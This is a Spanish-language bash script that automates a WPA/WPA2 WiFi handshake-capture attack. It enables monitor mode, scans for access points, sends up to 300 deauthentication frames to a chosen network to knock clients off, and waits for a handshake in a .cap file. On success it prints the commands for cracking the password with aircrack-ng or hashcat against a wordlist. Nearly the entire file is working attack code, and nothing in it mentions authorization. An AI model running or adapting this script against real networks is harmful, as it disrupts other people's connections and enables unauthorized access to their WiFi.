#!/usr/bin/env bash
# =============================================================================
# capturar_handshake.sh
# -----------------------------------------------------------------------------
# Captura un handshake WPA/WPA2 de una red WiFi usando aircrack-ng.
# Flujo:  monitor mode -> airodump -> aireplay (deauth) -> handshake en .cap
#
# Uso:
#   ./capturar_handshake.sh                          # interactivo (elige red)
#   ./capturar_handshake.sh -i wlan0 -t "MiRed"      # BSSID/SSID objetivo
#
# Requiere: aircrack-ng instalado, ejecutado como root (o con sudo).
# =============================================================================

set -euo pipefail

# ---------- Flags / argumentos --------------------------------------------
IFACE=""            # interfaz de radio (wlan0, wlp2s0, ...)
TARGET=""           # BSSID o SSID objetivo
CH=""               # canal 1..14
TIMEOUT=600         # seg max para esperar el handshake
OUTDIR="captures"

usage() {
  cat <<EOF
Uso: $0 [-i <iface>] [-t <bssid|ssid>] [-c <canal>] [-T <seg>]
  -i  interfaz WiFi (ej: wlan0)  -- auto-detectado si se omite
  -t  BSSID (AA:BB:CC:DD:EE:FF) o SSID objetivo
  -c  canal 1..14
  -T  timeout en segundos (default 600)
  -h  esta ayuda
EOF
  exit 1
}

while getopts "i:t:c:T:h" opt; do
  case "$opt" in
    i) IFACE="$OPTARG" ;;
    t) TARGET="$OPTARG" ;;
    c) CH="$OPTARG" ;;
    T) TIMEOUT="$OPTARG" ;;
    h) usage ;;
    \?) usage ;;
  esac
done

# ---------- Checks preliminares -------------------------------------------
if [[ $EUID -ne 0 ]]; then
  if command -v sudo &>/dev/null; then
    echo "[!] Re-lanzando con sudo..."
    SUDO=(sudo --preserve-env=bash)
    exec sudo "$BASH_SOURCE" "$@"
  else
    echo "[X] Requerido como root."
    exit 1
  fi
fi

for dep in airodump-ng aireplay-ng aircrack-ng capinfos; do
  if ! command -v "$dep" &>/dev/null; then
    echo "[X] Falta '$dep'. Instala: sudo apt install aircrack-ng"
    exit 1
  fi
done
# ---------- Detectar interfaz ------------------------------------------------
if [[ -z "$IFACE" ]]; then
  mapfile -t CANDIDATES < <(ip -o link show type wifi 2>/dev/null | awk -F': ' '{print $2}')
  if [[ ${#CANDIDATES[@]} -eq 0 ]]; then
    echo "[X] No hay interfaces WiFi visibles (ip -o link show type wifi)."
    echo "    Probá: ip link / iw dev"
    exit 1
  fi
  if [[ ${#CANDIDATES[@]} -eq 1 ]]; then
    IFACE="${CANDIDATES[0]}"
  else
    echo "[i] Elige una interfaz:"
    for i in "${!CANDIDATES[@]}"; do echo "  $((i+1)) - ${CANDIDATES[$i]}"; done
    read -rp "> " pick
    IFACE="${CANDIDATES[$((pick-1))]}"
  fi
fi
echo "[+] Interfaz: $IFACE"
IFACE_MON="${IFACE}mon"

# ---------- Modo monitor ------------------------------------------------------
if ! ip -o link show "$IFACE_MON" &>/dev/null; then
  echo "[+] Poniendo en modo monitor..."
  ip link set "$IFACE" down
  iw dev "$IFACE" interface add "$IFACE_MON" type monitor
  ip link set "$IFACE_MON" up
else
  echo "[+] Ya en modo monitor: $IFACE_MON"
fi

cleanup() {
  echo ""
  echo "[+] Restableciendo interfaz..."
  ip link show "$IFACE_MON" &>/dev/null && { ip link set "$IFACE_MON" down; ip link del "$IFACE_MON"; }
  ip link set "$IFACE" up
  echo "[OK] Listo."
}
trap cleanup EXIT INT TERM

# ---------- Escanear APs si no hay objetivo ---------------------------------
if [[ -z "$TARGET" ]]; then
  echo "[+] Escaneando APs (6s)..."
  SCAN="$(mktemp -d)"
  ( airodump-ng "$IFACE_MON" -w "$SCAN/x" >"$SCAN/out.txt" 2>&1 & echo $! > "$SCAN/pid" )
  sleep 6
  kill "$(cat "$SCAN/pid")" 2>/dev/null || true

  echo ""
  echo "BSSID                  CH   SSID"
  awk '/^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}/ {printf "%-18s %-4s %s\n",$1,$4,$6}' "$SCAN/out.txt" | head -20

  read -rp "BSSID objetivo (AA:BB:..): " TARGET
  if [[ -z "$TARGET" ]]; then
    echo "[!] Sin objetivo, abortando."
    exit 1
  fi
  # derivar canal
  CH=$(awk -v b="$TARGET" '$1==b{print $4; exit}' "$SCAN/out.txt")
  rm -rf "$SCAN"
fi

# si no hay canal y sí hay BSSID, sacarlo de un scan corto
if [[ -n "${TARGET:-}" && -z "${CH:-}" && "$TARGET" =~ ^[0-9A-Fa-f]{2}: ]]; then
  SCAN="$(mktemp -d)"
  ( airodump-ng "$IFACE_MON" -w "$SCAN/x" >"$SCAN/out.txt" 2>&1 & echo $! > "$SCAN/pid" )
  sleep 4
  kill "$(cat "$SCAN/pid")" 2>/dev/null || true
  CH=$(awk -v b="$TARGET" '$1==b{print $4; exit}' "$SCAN/out.txt")
  rm -rf "$SCAN"
fi

# ---------- Carpeta de salida ----------------------------------------------
mkdir -p "$OUTDIR"
STAMP=$(date +%y%m%d-%H%M%S)
OUT_BASE="$OUTDIR/handshake_${STAMP}_$(echo "$TARGET" | tr -cd 'A-Za-z0-9')"
echo "[+] Salida: $OUT_BASE*.cap   (canal=${CH:-auto})"

# ---------- Lanzar airodump + aireplay en paralelo -------------------------
AIRO_OPTS=()
[[ -n "$CH" ]] && AIRO_OPTS+=(-c "$CH")
if [[ "$TARGET" =~ ^[0-9A-Fa-f]{2}: ]]; then
  AIRO_OPTS+=(--bssid "$TARGET")
fi

airodump-ng "${AIRO_OPTS[@]}" -w "$OUT_BASE" "$IFACE_MON" >"$OUTDIR/airodump.log" 2>&1 &
AIRO_PID=$!

if [[ "$TARGET" =~ ^[0-9A-Fa-f]{2}: ]]; then
  aireplay-ng -9 -a "$TARGET" "$IFACE_MON" >"$OUTDIR/aireplay_probe.log" 2>&1 || true
  aireplay-ng -0 300 -a "$TARGET" "$IFACE_MON" >"$OUTDIR/aireplay.log" 2>&1 &
else
  aireplay-ng -0 300 "${AIRO_OPTS[@]}" "$IFACE_MON" >"$OUTDIR/aireplay.log" 2>&1 &
fi
AIRE_PID=$!

echo "[$(date +%T)] Escuchando por handshake (timeout ${TIMEOUT}s)..."

# ---------- Esperar a que aparezca el handshake -----------------------------
START=$(date +%s)
FOUND=0
CAP="${OUT_BASE}-01.cap"
while :; do
  NOW=$(date +%s); ELAPSED=$((NOW-START))
  if [[ $FOUND -eq 1 || $ELAPSED -ge $TIMEOUT ]]; then break; fi
  if [[ -f "$CAP" ]] && capinfos "$CAP" 2>/dev/null | grep -qiE "(WPA|WPA2).*handshake|auth.*[Cc]rypt.*4"; then
    FOUND=1
    break
  fi
  sleep 3
  printf "\r[%s] esperando... %3ds / %ds  " "$(date +%T)" "$ELAPSED" "$TIMEOUT"
done
echo ""

# ---------- Cleanup de procesos --------------------------------------------
kill "$AIRO_PID" "$AIRE_PID" 2>/dev/null || true
wait "$AIRO_PID" 2>/dev/null || true
wait "$AIRE_PID" 2>/dev/null || true

# ---------- Diagnóstico -----------------------------------------------------
if [[ $FOUND -eq 1 && -f "$CAP" ]]; then
  echo ""
  echo "[OK] Handshake capturado en: $CAP"
  capinfos "$CAP" | head -20 || true
  echo ""
  echo "Siguiente paso: crackea el diccionario:"
  echo "  aircrack-ng $CAP -w <diccionario.txt>"
  echo "  o mejor: hcxpcapngtool -o hash.hc22000 $CAP && hashcat -m 22000 hash.hc22000 -a 0 <dic>"
else
  echo ""
  echo "[!] Sin handshake dentro del timeout."
  echo "    Revisá $OUTDIR/airodump.log y $OUTDIR/aireplay.log"
  echo "    Tips:"
  echo "      - red WPA/WPA2 (no WPA3/SAE)"
  echo "      - reiniciá un cliente de la red para forzar reconexión"
  echo "      - si sabés el canal, fijalo con -c"
fi
